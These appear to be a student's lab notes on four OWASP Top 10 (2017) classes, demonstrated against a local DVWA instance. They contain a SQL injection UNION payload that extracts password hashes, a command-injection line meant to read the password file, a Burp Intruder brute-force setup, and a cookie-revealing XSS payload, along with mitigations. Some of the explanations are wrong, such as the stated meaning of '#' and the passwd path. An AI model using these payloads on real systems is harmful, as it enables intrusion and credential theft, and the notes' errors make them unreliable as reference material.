# OWASP Top 10 - A Primer
This document explores the 10 vulnerability classes discussed in [OWASP Top 10 - 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).

## Vulnerabilities
### A1:2017 - Injections
#### Definition / Description

Source: Almost any source of data is a potential infection vector, including enviromental, parameters, external & internal web services, and users
Severity: HIGH, Data loss, corruption, loss of accountability, or Denial of access.
Scope: COMMON, there is alot of data that is being passed around that can get infected.
Damage: Depends on the need of the data/ application so it varies from case to case.

#### How it Works
As an attacker I am looking for any point on ingress. my best bet is checking to see if the person I am attacked is using legacy code such as SQL, XML parsers, OS Commands and SMTP Headers. What I try is to login with a peice of code from a code base that I think the company is using and if it reacts then bingo I now have a stepping stone into your systems.

#### Scenario
My intended SQL query is the following: `%' UNION SELECT user, password from users #`. Once injected my query looks like so: 
`ID: %' UNION SELECT user, password from users #`
`First name: admin`
`Surname: 5f4dcc3b5aa765d61d8327deb882cf99`
What the code above means is so:
ID: (sets the ID) %' (tells the database to look for any and all characters) UNION (Join the 2 statements into one) SELECT (Choose the input) user,password (get the user and password) from users (from the users database) # (any number from 1-255)

Strategies to patch SQL injection include using a safe api which avoids the use of the interpreter and use a whitelist to validate the user input

Another type of injection is a command injections: `./example.sh ; cat /usr/passwd` would most likly not work but essentially once you run example.sh the ; allows another command to run which would get the user's passwords. it is simular to an SQL injection in that you are tricking the system to do something it isn't supposed to do butthe method is different.

---
### A2:2017 - Broken Authentication
#### Definition / Description

Source: App specific but attackers have access to millions of usernames and passwords to use for credential stuffing.
Severity: HIGH, once an attacker has access to logins from your application it is only a matter of time before the get access to the vital parts
Scope: COMMON, due to the sheer number of vectors and the design of the login systems
Damage: Depends on the application and data but can lead to money laundering, social security fraud, and identity theft.

#### How it Works
Brute force is a way to force multiple login attempts through a system to see if something works. it is considered a form of broken authentication because of how easy it is for an attcker to gain access to a system with force.

#### Scenario
As an attacker I want to log into a system, well how do I do that? It would take me literal ages to iterate all of the possible cominations I have at my fingertips so why not use a tool such as burp suite to make my job easier. So here is what I do. I go to the website I want to hack (DVWA) and I turn on my burp suite proxy to capture any requests made from the website. Using the burp suite intruder I create a payload position (§§) at username=§1§ and password=§2§ the §#§ allows me to enter the data that I am going to use. I create a list of usernames at #1 and passwords at #2 and then attempt to access the system. 

---
##### Raw Request 
```
GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1

Host: 10.0.0.87

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.0.0.87/dvwa/vulnerabilities/brute/

Connection: close

Cookie: security=low; PHPSESSID=efql019acl3531g7he4q74b7u0

Upgrade-Insecure-Requests: 1
```

##### Intruder Request 
```
GET /dvwa/vulnerabilities/brute/?username=§admin§&password=§password§&Login=Login HTTP/1.1

Host: 10.0.0.87

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.0.0.87/dvwa/vulnerabilities/brute/

Connection: close

Cookie: security=low; PHPSESSID=efql019acl3531g7he4q74b7u0

Upgrade-Insecure-Requests: 1
```
##### Valid Response(s)
```
HTTP/1.1 200 OK

Date: Sat, 01 Feb 2020 22:40:59 GMT

Server: Apache/2.4.29 (Ubuntu)

Expires: Tue, 23 Jun 2009 12:00:00 GMT

Cache-Control: no-cache, must-revalidate

Pragma: no-cache

Vary: Accept-Encoding

Content-Length: 4424

Connection: close

Content-Type: text/html;charset=utf-8





<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">



<html xmlns="http://www.w3.org/1999/xhtml">



	<head>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />



		<title>Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>



		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />



		<link rel="icon" type="\image/ico" href="../../favicon.ico" />



		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>



	</head>



	<body class="home">

		<div id="container">



			<div id="header">



				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />



			</div>



			<div id="main_menu">



				<div id="main_menu_padded">

				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
<li class=""><a href="../../instructions.php">Instructions</a></li>
<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
</ul><ul class="menuBlocks"><li class="selected"><a href="../../vulnerabilities/brute/">Brute Force</a></li>
<li class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
<li class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
<li class=""><a href="../../about.php">About</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
</ul>

				</div>



			</div>



			<div id="main_body">



				

<div class="body_padded">

	<h1>Vulnerability: Brute Force</h1>



	<div class="vulnerable_code_area">

		<h2>Login</h2>



		<form action="#" method="GET">

			Username:<br />

			<input type="text" name="username"><br />

			Password:<br />

			<input type="password" AUTOCOMPLETE="off" name="password"><br />

			<br />

			<input type="submit" value="Login" name="Login">


		</form>

		<p>Welcome to the password protected area admin</p><img src="/dvwa/hackable/users/admin.jpg" />

	</div>



	<h2>More Information</h2>

	<ul>

		<li><a href="https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)" target="_blank">https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)</a></li>

		<li><a href="http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password" target="_blank">http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password</a></li>

		<li><a href="http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html" target="_blank">http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html</a></li>

	</ul>

</div>


				<br /><br />

				



			</div>



			<div class="clear">

			</div>



			<div id="system_info">

				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=brute&security=low' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=brute&security=low' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> low<br /><em>PHPIDS:</em> disabled</div>

			</div>



			<div id="footer">



				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>

				<script src='../..//dvwa/js/add_event_listeners.js'></script>



			</div>



		</div>



	</body>



</html>

```

##### Mitigation
Strategies to mitigate broken authentication include multi-factor authentication to prevent automated credential stuffing and brute force attacks, do not use defult passwords in general

---
### A6:2017 - Security Misconfiguration
#### Definition / Description

Source: Unpatched flaws, default accounts, unused pages, unprotected files
Severity:HIGH, attackers are given unauthorized access to some system data or functionality which could result in compromise
Scope:Wide spread, it can happen at any level of the data chain including network services, webserver, database and virtual machines.
Damage: Depends, the amount of damage varies on the protection the application and data need.

#### How it Works
below are how allow_url_fopen and allow_url_include work:
allow_url_fopen boolean
This option enables the URL-aware fopen wrappers that enable accessing URL object like files. Default wrappers are provided for the access of remote files using the ftp or http protocol, some extensions like zlib may register additional wrappers.
allow_url_include boolean
This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once.
To summerize, fopen and include let urls be used files which allow attackers to exploit the system.
Remote File Inclusion (RFI) is possible under the following conditions:  fopen and include need to be enabled to allow the hacker to attack remotely
The RFI on DVWA is a security misconfiguration because it allows attackers to open urls like files (fopen) and lets them include other things as well (include)

#### Scenario

  ```php
  allow_url_fopen = Off
  allow_url_include = Off
  ```
---
### A7:2017 - Cross-Site Scripting (XSS)
#### Definition / Description

Source: Web browsers, HTTP headers, API's Javascript
Severity: HIGH, stealing crediations, delivering malware to victims, remote code execution.
Scope: WIDE SPREAD, it is the second most common attack according to owasp and is found in 2/3rds of all applications
Types of XSS:
	Reflected XSS: The application inculdes unvalidated userinput that could allow the attacker to execute arbitrart HTML code.
	Stored XSS: The API stores unsanitized user input that is viewed at a later time by another user.
	DOM XSS: Javascript framework, APIS that include attacker controlable data to a page are vulnerable.
Types of attacks: Sesson stealing, account takeover, MFA bypass, key logging, ETC..
 
#### How it Works
A reflected XSS attack uses javascript to execute code. If I can for example make a popup happen then I can get the users session id to appear and I can hijack the user's sesson.

#### Scenario
As an attacker I want to gain access to a user's session id so I can hijack them and gain valuable info. The best way to do this is via a popup through an input. On DVWA I can submit my name and it will echo it back to me. That tells me that I can inject a code into the field to make a popup appear. The script I want to use is: <script>alert(document.cookie)</script>. in javascript alert is the popup that appears and document.cookie it my current session id.

```
GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1

Host: 10.0.0.87

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: security=low; PHPSESSID=efql019acl3531g7he4q74b7u0

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```
 
